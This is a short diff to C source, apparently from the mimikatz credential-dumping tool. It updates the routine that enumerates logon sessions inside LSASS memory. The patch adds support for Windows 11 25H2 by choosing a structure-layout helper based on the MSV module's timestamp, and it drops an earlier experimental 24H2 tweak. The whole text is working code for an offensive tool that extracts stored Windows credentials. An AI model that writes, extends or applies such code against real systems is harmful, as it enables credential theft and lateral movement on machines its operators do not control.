@@ -316,14 +316,16 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 			helper = &lsassEnumHelpers[5];
 		else if (cLsass.osContext.BuildNumber < KULL_M_WIN_BUILD_11_24H2)
 			helper = &lsassEnumHelpers[6];
+		else if (cLsass.osContext.BuildNumber < KULL_M_WIN_BUILD_11_25H2)
+			if(kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp >= 0xd133958f)
+				helper = &lsassEnumHelpers[8];
+			else
+				helper = &lsassEnumHelpers[7];
 		else
-			helper = &lsassEnumHelpers[7];
+			helper = &lsassEnumHelpers[8];
 
 		if((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
 			helper++; // yeah, really, I do that =)
-
-		if ((cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_11_24H2) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp == 28698614))
-			helper++; // experimental
 
 		securityStruct.hMemory = cLsass.hLsassMem;
 		if(securityStruct.address = LogonSessionListCount)
